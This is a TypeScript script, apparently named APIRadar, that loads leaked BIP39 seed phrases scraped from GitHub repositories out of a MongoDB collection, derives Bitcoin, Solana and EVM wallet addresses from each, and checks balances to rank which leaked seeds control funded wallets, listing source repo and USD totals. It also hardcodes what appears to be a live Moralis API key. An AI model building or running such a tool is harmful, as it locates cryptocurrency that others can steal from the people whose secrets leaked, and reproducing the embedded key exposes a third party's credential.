import mongoose from 'mongoose';
import chalk from 'chalk';
import * as bip39 from 'bip39';
import { BIP32Factory } from 'bip32';
import * as ecc from 'tiny-secp256k1';
import * as bitcoin from 'bitcoinjs-lib';
import { ethers } from 'ethers';
import { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import axios from 'axios';

// FIX: Use require for this specific library to bypass TS type errors
const ed25519 = require('ed25519-hd-key');

// --- CONFIGURATION ---
const MONGODB_URI = "mongodb://localhost:27017/apiradar";
const MORALIS_API = 'https://deep-index.moralis.io/api/v2.2';
const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
const ACCOUNTS_TO_SCAN = 3;

const EVM_CHAINS = [
  { id: 'eth', name: 'Ethereum', symbol: 'ETH', decimals: 18 },
  { id: 'bsc', name: 'BSC', symbol: 'BNB', decimals: 18 },
  { id: 'polygon', name: 'Polygon', symbol: 'POL', decimals: 18 },
  { id: 'base', name: 'Base', symbol: 'ETH', decimals: 18 },
  { id: 'arbitrum', name: 'Arbitrum', symbol: 'ETH', decimals: 18 },
];

const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));
const bip32 = BIP32Factory(ecc);

const MORALIS_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxZjc5ZGNhLTUwZTItNGYzMi05YmFmLWU0ODQ2MDJjZGEwMSIsIm9yZ0lkIjoiNTAwNzM4IiwidXNlcklkIjoiNTE1MjM0IiwidHlwZUlkIjoiZTUyNjg3NmMtMGYzOS00YTc5LWFmZDMtZDhkMDJkODI2MmNlIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzExNDcyNDIsImV4cCI6NDkyNjkwNzI0Mn0.rYtSUofZsYXrvETQ6iGrFNWQW7vJIiSO8OjC4pl306s';

function getApiKey(): string {
  return process.env['MORALIS_API_KEY'] || process.argv[2] || MORALIS_KEY;
}

function isSpam(name: string): boolean {
  const n = (name || '').toLowerCase();
  return n.includes('.com') || n.includes('.io') || n.includes('visit') || n.includes('claim') || n.includes('http');
}

// --- BITCOIN ENGINE ---
async function checkBitcoin(seedPhrase: string, index: number) {
  try {
    const seed = Uint8Array.from(await bip39.mnemonicToSeed(seedPhrase));
    const root = bip32.fromSeed(seed);
    const path = `m/84'/0'/0'/0/${index}`;
    const child = root.derivePath(path);

    const { address } = bitcoin.payments.p2wpkh({
      pubkey: child.publicKey,
      network: bitcoin.networks.bitcoin
    });

    if (!address) return null;

    const { data } = await axios.get(`https://mempool.space/api/address/${address}`);
    const satoshis = (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) +
      (data.mempool_stats.funded_txo_sum - data.mempool_stats.spent_txo_sum);

    if (satoshis > 0) {
      const btc = satoshis / 100000000;
      const priceRes = await axios.get('https://mempool.space/api/v1/prices');
      return { address, balance: btc, usd: btc * priceRes.data.USD };
    }
  } catch (e) { return null; }
  return null;
}

// --- SOLANA ENGINE ---
async function checkSolana(seed: Uint8Array, index: number) {
  try {
    const path = `m/44'/501'/${index}'/0'`;
    // FIX: Convert Buffer to Hex string for ed25519 library
    const derived = ed25519.derivePath(path, Buffer.from(seed).toString('hex'));
    if (!derived?.key) return null;
    const keypair = Keypair.fromSeed(Uint8Array.from(derived.key).slice(0, 32));
    const publicKey = keypair.publicKey;
    const connection = new Connection(SOLANA_RPC);

    const balance = await connection.getBalance(publicKey);
    const sol = balance / LAMPORTS_PER_SOL;

    // Fetch SPL Tokens
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
      programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
    });

    let tokens: any[] = [];

    // FIX: Added ': any' to 't' to satisfy TypeScript
    for (const t of tokenAccounts.value) {
      const info = (t.account.data as any).parsed.info;
      const amount = info.tokenAmount.uiAmount;
      const mint = info.mint;

      if (amount > 0) {
        try {
          const priceRes = await axios.get(`https://api.jup.ag/price/v2?ids=${mint}`);
          const price = priceRes.data.data[mint]?.price || 0;
          const usd = amount * price;

          if (usd > 0.01) {
            tokens.push({ mint, amount, usd });
          }
        } catch (e) { }
      }
    }

    if (sol > 0 || tokens.length > 0) {
      const solPriceRes = await axios.get('https://api.jup.ag/price/v2?ids=So11111111111111111111111111111111111111112');
      const solPrice = solPriceRes.data.data['So11111111111111111111111111111111111111112']?.price || 0;
      return { address: publicKey.toBase58(), sol, solUsd: sol * solPrice, tokens };
    }

  } catch (e) { return null; }
  return null;
}

// --- EVM ENGINE ---
async function checkEvm(address: string, apiKey: string) {
  const headers = { 'X-API-Key': apiKey };
  const foundData: any[] = [];

  for (const chain of EVM_CHAINS) {
    try {
      await sleep(2000);
      const [balRes, tokenRes] = await Promise.all([
        axios.get(`${MORALIS_API}/${address}/balance`, { params: { chain: chain.id }, headers }),
        axios.get(`${MORALIS_API}/${address}/erc20`, { params: { chain: chain.id }, headers })
      ]);

      const native = Number(ethers.formatUnits(balRes.data.balance || '0', chain.decimals));

      // FIX: Added ': any' to 't' to satisfy TypeScript
      const validTokens = (tokenRes.data || [])
        .filter((t: any) => !isSpam(t.name) && Number(t.usd_value) > 1)
        .map((t: any) => ({
          symbol: t.symbol,
          balance: Number(ethers.formatUnits(t.balance, t.decimals)).toFixed(4),
          usd: Number(t.usd_value)
        }));

      if (native > 0 || validTokens.length > 0) {
        foundData.push({ chain: chain.name, native, tokens: validTokens });
      }
    } catch (e) { }
  }
  return foundData;
}

// --- MAIN RUNNER ---
async function run() {
  const apiKey = getApiKey();
  const startTime = Date.now();
  console.log(chalk.cyan('\n🚀 APIRadar: GOD MODE (BTC + SOL + EVM Scanner'));
  console.log(chalk.gray('   Chains: Bitcoin · Solana · Ethereum · BSC · Polygon · Base · Arbitrum'));
  console.log(chalk.gray(`   Accounts per seed: ${ACCOUNTS_TO_SCAN}\n`));

  await mongoose.connect(MONGODB_URI);
  console.log(chalk.green('✅ Database connected'));

  const leaks = await mongoose.connection.db!.collection('leaks').find({ provider: 'bip39_seed_phrase' }).toArray();
  const validLeaks = leaks.filter(l => bip39.validateMnemonic(String(l['fullKey'] || '').trim()));
  console.log(chalk.white(`   ${leaks.length} seeds found, ${validLeaks.length} valid mnemonics\n`));

  const hits: { seed: number; repo: string; file: string; findings: string[]; totalUsd: number }[] = [];
  let scanned = 0;

  for (let i = 0; i < leaks.length; i++) {
    const leak = leaks[i]!;
    const phrase = String(leak['fullKey'] || '').trim();
    if (!bip39.validateMnemonic(phrase)) continue;

    scanned++;
    const repo = String(leak['repoUrl'] || '').replace('https://github.com/', '');
    const file = String(leak['filePath'] || '');
    process.stdout.write(chalk.gray(`\r   Scanning ${scanned}/${validLeaks.length}: ${repo.slice(0, 40)}...`));

    const findings: string[] = [];
    let seedTotalUsd = 0;

    // 1. SCAN BITCOIN
    for (let idx = 0; idx < ACCOUNTS_TO_SCAN; idx++) {
      const btc = await checkBitcoin(phrase, idx);
      if (btc) {
        findings.push(chalk.yellow(`  🟠 BTC[${idx}]  `) + chalk.white(`${btc.balance.toFixed(8)} BTC`) + chalk.green(` ($${btc.usd.toFixed(2)})`) + chalk.gray(`  ${btc.address}`));
        seedTotalUsd += btc.usd;
      }
    }

    // 2. SCAN SOLANA
    const seedBuf = Uint8Array.from(await bip39.mnemonicToSeed(phrase));
    for (let idx = 0; idx < ACCOUNTS_TO_SCAN; idx++) {
      const sol = await checkSolana(seedBuf, idx);
      if (sol) {
        findings.push(chalk.magenta(`  ◎ SOL[${idx}]  `) + chalk.white(`${sol.sol.toFixed(4)} SOL`) + chalk.green(` ($${sol.solUsd.toFixed(2)})`) + chalk.gray(`  ${sol.address}`));
        seedTotalUsd += sol.solUsd;
        for (const t of sol.tokens) {
          findings.push(chalk.magenta(`           + `) + chalk.white(`${t.amount.toFixed(2)} SPL`) + chalk.green(` ($${t.usd.toFixed(2)})`) + chalk.gray(`  ${t.mint.slice(0, 8)}...`));
          seedTotalUsd += t.usd;
        }
      }
    }

    // 3. SCAN EVM
    const ethRoot = ethers.HDNodeWallet.fromPhrase(phrase, undefined, "m");
    for (let idx = 0; idx < ACCOUNTS_TO_SCAN; idx++) {
      const wallet = ethRoot.derivePath(`m/44'/60'/0'/0/${idx}`);
      const evm = await checkEvm(wallet.address, apiKey);
      if (evm.length > 0) {
        for (const c of evm as any[]) {
          if (c.native > 0) {
            findings.push(chalk.blue(`  ⟠ ${c.chain.padEnd(9)}`) + chalk.white(`${c.native.toFixed(6)} native`) + chalk.gray(`  ${wallet.address}`));
          }
          for (const t of c.tokens as any[]) {
            findings.push(chalk.blue(`           + `) + chalk.white(`${t.balance} ${t.symbol}`) + chalk.green(` ($${t.usd.toFixed(2)})`));
            seedTotalUsd += t.usd;
          }
        }
      }
    }

    if (findings.length > 0) {
      process.stdout.write('\r' + ' '.repeat(80) + '\r');
      console.log(chalk.cyan(`\n━━━ Seed #${i + 1} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`));
      console.log(chalk.white(`  Source:  `) + chalk.yellow(repo));
      console.log(chalk.white(`  File:    `) + chalk.yellow(file));
      console.log(chalk.white(`  Words:   `) + chalk.white(String(phrase.split(/\s+/).length)));
      console.log('');
      findings.forEach(f => console.log(f));
      console.log(chalk.green(`\n  💰 Seed Total: $${seedTotalUsd.toFixed(2)}`));
      hits.push({ seed: i + 1, repo, file, findings, totalUsd: seedTotalUsd });
    }
  }

  process.stdout.write('\r' + ' '.repeat(80) + '\r');
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

  console.log(chalk.cyan('\n\n══════════════════════════════════════════════'));
  console.log(chalk.cyan('  📊 SCAN SUMMARY'));
  console.log(chalk.cyan('══════════════════════════════════════════════'));
  console.log(chalk.white(`  Seeds scanned:    ${validLeaks.length}`));
  console.log(chalk.white(`  Funded wallets:   `) + (hits.length > 0 ? chalk.green(String(hits.length)) : chalk.gray('0')));

  if (hits.length > 0) {
    const grandTotal = hits.reduce((sum, h) => sum + h.totalUsd, 0);
    console.log(chalk.white(`  Total value:      `) + chalk.green(`$${grandTotal.toFixed(2)}`));
    console.log('');
    for (const h of hits) {
      console.log(chalk.white(`  Seed #${String(h.seed).padEnd(4)}`) + chalk.green(`$${h.totalUsd.toFixed(2).padStart(12)}`) + chalk.gray(`  ${h.repo.slice(0, 45)}`));
    }
  }

  console.log(chalk.gray(`\n  Completed in ${elapsed}s. No database changes made.\n`));

  await mongoose.connection.close();
  process.exit(0);
}

run();
